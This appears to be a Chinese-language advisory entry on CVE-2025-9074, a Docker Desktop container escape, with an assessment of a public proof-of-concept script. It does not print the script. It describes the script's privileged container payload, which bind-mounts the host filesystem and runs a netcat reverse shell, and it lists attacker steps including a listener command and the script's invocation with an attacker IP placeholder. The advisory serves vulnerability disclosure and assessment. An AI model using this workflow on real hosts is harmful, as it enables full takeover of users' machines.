## CVE-2025-9074 - Docker Desktop 容器越权访问/逃逸

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器越权访问/逃逸

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Windows和macOS版本的Docker Desktop，已于Docker Desktop 4.44.3版本中修复，受影响版本为4.44.3之前。

**利用条件:** 需要本地运行的恶意Linux容器能够通过默认子网（192.168.65.7:2375）直接访问Docker Engine API，不依赖挂载Docker socket。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是影响Docker Desktop（Windows和macOS版本）的一个高危容器越权访问/逃逸漏洞，CVSS评分为9.3（满分10分）。该漏洞允许本地运行的恶意Linux容器绕过Docker隔离机制，通过预配置的默认子网（192.168.65.7:2375）直接访问宿主机的Docker Engine API。此漏洞不依赖于挂载Docker socket，因此攻击者即使在没有直接访问Docker socket的情况下，也能利用该漏洞。攻击者一旦在受影响的Docker Desktop环境中成功运行一个恶意容器，即可通过未授权的Docker Engine API创建具有特权配置（如`Privileged: true`、宿主机文件系统挂载、`NetworkMode: host`）的新容器，从而实现容器逃逸并获得宿主机的完全控制权限。该漏洞由安全研究员Felix Boulet无意中发现，并已于2025年8月20日在Docker Desktop 4.44.3版本中得到修复。

提供的POC是一个名为`cve-2025-9074.sh`的bash脚本，它精确地复现了CVE-2025-9074漏洞的利用流程。脚本首先通过`curl`命令验证Docker Engine API是否可达，然后构造一个JSON payload。这个payload被用于向Docker Engine API的`/containers/create`端点发送POST请求，以创建一个新的容器。该payload的关键在于其`HostConfig`配置：`"Binds": ["/:/hostfs:rw"]`将宿主机的根文件系统以读写方式挂载到容器内的`/hostfs`目录；`"Privileged": true`赋予容器几乎等同于宿主机的权限；`"NetworkMode": "host"`允许容器共享宿主机的网络命名空间。容器的`Cmd`参数被精心设计，用于在容器启动时执行一个Netcat反向shell命令，将宿主机的shell连接回攻击者指定的监听地址和端口。一旦容器被成功创建并启动，反向shell便会触发，从而实现从恶意容器到宿主机的完全控制，有效证明了容器逃逸的可能性。该POC的利用链条完整、逻辑清晰，高度还原了漏洞的本质，因此被评估为具有很高的有效性。

**利用步骤：**
1.  **前提条件：** 攻击者需要在受影响的Docker Desktop环境中，通过某种方式（例如诱骗用户运行恶意镜像或利用其他漏洞）成功运行一个恶意Linux容器。
2.  **启动监听器：** 在攻击者的控制机器上，启动一个Netcat监听器，用于接收反向shell连接。例如：`nc -lvnp <listener_port>`。
3.  **执行POC脚本：** 在恶意容器内部，攻击者执行提供的POC脚本，并传入目标Docker Engine API的IP和端口（默认为`192.168.65.7:2375`），以及攻击者机器的IP和监听端口。命令格式为：`./cve-2025-9074.sh 192.168.65.7 2375 <attacker_ip> <listener_port>`。
4.  **创建特权容器：** POC脚本通过`curl`向宿主机的Docker Engine API发送请求，创建一个配置了特权模式、宿主机文件系统挂载和Host网络模式的新容器。
5.  **触发反向Shell：** 新创建的特权容器随即执行内嵌的反向shell payload。
6.  **获得宿主机权限：** 攻击者在Netcat监听器上收到反向shell连接，成功获得宿主机的root权限访问，完成容器逃逸。

**投毒风险分析：**
提供的POC代码（`cve-2025-9074.sh`）在投毒风险方面被评估为低风险（10%）。该脚本代码结构清晰，易于阅读和理解，主要使用了`curl`命令与Docker API进行交互，以及`cat`、`grep`、`cut`等常见的shell工具进行文本处理。脚本中没有发现任何代码混淆、可疑的外部网络请求（除了连接到攻击者设定的反向shell地址外），或者利用`eval`等高风险函数的情况。虽然POC的最终目的是通过反向shell获取系统控制权，但这属于漏洞利用的预期效果，而不是POC脚本自身携带的附加恶意功能。POC的目的是为了安全研究和验证漏洞的存在，而不是通过POC本身来感染用户。因此，在合法、授权的测试环境下使用该POC是安全的，其代码本身不包含隐藏的恶意行为或投毒逻辑。

**项目地址:** 

**漏洞详情:** 
